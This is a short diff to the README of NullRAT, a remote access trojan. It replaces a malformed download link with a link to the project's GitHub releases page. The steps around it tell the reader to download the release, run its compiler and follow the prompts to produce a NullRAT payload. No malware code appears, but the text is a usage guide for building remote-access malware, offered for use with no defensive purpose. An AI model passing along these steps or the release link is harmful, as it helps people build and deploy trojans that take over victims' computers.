@@ -92,7 +92,7 @@
 
 #### Steps:
 1. Dowload the latest release of NullRAT (recommended) [**git clone**/**download zip** are no longer supported]
-2. DOWNLOAD LINK :- - lINK(https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#discord-bot-token](https://github.com/NullCode1337/NullRAT/releases)
+2. DOWNLOAD LINK :- - (https://github.com/NullCode1337/NullRAT/releases)
 3. Run the Compiler and follow the prompts. NullRAT payload will be right there!
 
 
